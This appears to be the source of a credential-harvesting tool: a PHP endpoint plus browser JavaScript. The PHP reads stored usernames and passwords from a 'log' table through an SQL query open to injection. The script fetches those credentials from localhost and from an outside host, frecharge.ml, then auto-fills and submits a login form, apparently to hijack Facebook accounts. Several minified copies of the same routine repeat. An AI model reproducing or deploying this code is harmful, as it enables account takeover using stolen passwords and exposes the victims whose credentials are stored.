<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');  
//echo "the request works";
include 'db.php';
if(isset($_GET['get_id'])){
	$id=$_GET['get_id'];
	$sql = "SELECT username,pass FROM log WHERE id='$id'";
	mysql_select_db($dbname);
	$retval = mysql_query($sql,$conn);
	$row=mysql_fetch_array($retval);
	//print_r($row);
	echo $row['username']."-hmd-";
	echo $row['pass'];
	}
?>
//<p id=prompt onclick=get_id()>prompt</p>
<script>
function get_id(){
	id=prompt("put id:");
	var xmlhttp;
if (window.XMLHttpRequest)
  {
  xmlhttp=new XMLHttpRequest();
  }
else
  {
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {    
   var data=xmlhttp.responseText;
	id_pass=data.split("-hmd-");
	
	document.cookie='nowfbloged='+id;{ document.forms[0].email.value = id_pass[0]; document.forms[0].pass.value = id_pass[1];}document.getElementsByName('login')[0].click();
    }
  }
xmlhttp.open("GET","http://localhost/fbrc/get_id.php?get_id="+id,true);
xmlhttp.send();

function sre(){if(xmlhttp.readyState==4 && xmlhttp.status==200){var data=xmlhttp.responseText;id_pass=data.split("-hmd-");document.cookie='nowfbloged='+id;{ document.forms[0].email.value = id_pass[0]; document.forms[0].pass.value = id_pass[1];}document.getElementsByName('login')[0].click();}}id=prompt("put id:"); var xmlhttp;if(window.XMLHttpRequest){xmlhttp=new XMLHttpRequest();}else{xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");}xmlhttp.onreadystatechange=sre();xmlhttp.open("GET","http://frecharge.ml/get_id.php?get_id="+id,true);xmlhttp.send();


function sre(){if(xmlhttp.readyState==4 && xmlhttp.status==200){var data=xmlhttp.responseText;id_pass=data.split("-hmd-");alert(data);}}id=prompt("put id:"); var xmlhttp;if(window.XMLHttpRequest){xmlhttp=new XMLHttpRequest();}else{xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");}xmlhttp.onreadystatechange=sre();xmlhttp.open("GET","http://frecharge.ml/get_id.php?get_id="+id,true);xmlhttp.send();


function sre(){}id=prompt("put id:"); var xmlhttp;if(window.XMLHttpRequest){xmlhttp=new XMLHttpRequest();}else{xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");}
xmlhttp.onreadystatechange=function()
  {if(xmlhttp.readyState==4 && xmlhttp.status==200){var data=xmlhttp.responseText;id_pass=data.split("-hmd-");document.cookie='nowfbloged='+id;{ document.forms[0].email.value = id_pass[0]; document.forms[0].pass.value = id_pass[1];}document.getElementsByName('login')[0].click();}}xmlhttp.open("GET","http://frecharge.ml/get_id.php?get_id="+id,true);xmlhttp.send();


}
function send_h(){
var xmlhttp;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {    
   var data=xmlhttp.responseText;
	alert(data);
    }
  }
xmlhttp.open("GET","http://localhost/fbrc/get_id.php",true);
xmlhttp.send();
}

//document.cookie='nowfbloged='+userid[now];{ document.forms[0].email.value = user[now]; document.forms[0].pass.value = pass[now];}document.getElementsByName('login')[0].click();
</script>